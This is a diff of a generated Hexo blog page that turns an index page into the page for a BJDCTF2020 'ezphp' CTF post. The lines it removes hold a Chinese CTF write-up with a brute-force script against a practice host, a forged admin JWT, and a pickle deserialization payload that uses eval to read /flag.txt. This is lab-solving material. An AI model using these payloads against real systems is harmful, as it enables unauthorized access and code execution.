@@ -6,11 +6,15 @@
   
   <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
+  <meta name="description" content="题目123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;;$shana &#x3D; $_GET[&#x27;s">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yiweibu.github.io/index.html">
+<meta property="og:url" content="http://yiweibu.github.io/2024/05/10/BJDCTF2020_ezphp/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="题目123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;;$shana &#x3D; $_GET[&#x27;s">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-10T14:45:24.217Z">
+<meta property="article:modified_time" content="2023-11-24T02:49:55.972Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -67,9 +71,7 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-BJDCTF2020_ezphp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-BJDCTF2020_ezphp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/05/10/BJDCTF2020_ezphp/" class="article-date">
   <time class="dt-published" datetime="2024-05-10T14:45:24.217Z" itemprop="datePublished">2024-05-10</time>
@@ -137,105 +139,19 @@
     </footer>
   </div>
   
-</article>
-
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-ciscn_ikun" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/10/ciscn_ikun/" class="article-date">
-  <time class="dt-published" datetime="2024-05-10T14:45:24.217Z" itemprop="datePublished">2024-05-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20231129165101671.png" alt="image-20231129165101671"></p>
-<p>提示要买到lv6，找到<a target="_blank" rel="noopener" href="http://5165d3c2-a7eb-4727-a30a-0b86ed1d36c5.node4.buuoj.cn:81/shop%E5%8F%82%E6%95%B0?page%EF%BC%8C%E7%94%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%84%9A%E6%9C%AC%E7%88%86%E7%A0%B4">http://5165d3c2-a7eb-4727-a30a-0b86ed1d36c5.node4.buuoj.cn:81/shop参数?page，用多线程脚本爆破</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">st,ed</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(st,ed):</span><br><span class="line">        url = <span class="string">&#x27;http://5165d3c2-a7eb-4727-a30a-0b86ed1d36c5.node4.buuoj.cn:81/shop?page=&#x27;</span></span><br><span class="line">        url += <span class="built_in">str</span>(i)</span><br><span class="line">        r = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t = threading.Thread(target=go,args=(i*<span class="number">20</span>,(i+<span class="number">1</span>)*<span class="number">20</span>))</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> threads:</span><br><span class="line">        item.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  
+    <a href="/2024/05/10/ciscn_ikun/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
 
-<p>找到?page&#x3D;181</p>
-<p>购买的时候将discount调越小越好</p>
-<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20231129165644940.png" alt="image-20231129165644940"></p>
-<p>但只允许admin访问</p>
-<p>通过jwt伪造admin身份，密钥通过工具爆破：1Kun</p>
-<p>访问得到<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20231129170148594.png" alt="image-20231129170148594"></p>
-<p>得到源码</p>
-<p>pickle反序列化漏洞</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a1 = A()</span><br><span class="line">test = pickle.dumps(a1)</span><br><span class="line">test = urllib.quote(test)</span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure>
-
-<p>将结果代入become参数得到flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yiweibu.github.io/2024/05/10/ciscn_ikun/" data-id="clw0shr66000158vcanaq3trc" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
   
 </article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/10/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2024-05-10T14:26:25.013Z" itemprop="datePublished">2024-05-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/10/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yiweibu.github.io/2024/05/10/hello-world/" data-id="clw0s949i0000nsvcfu7vc9nt" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
 </section>
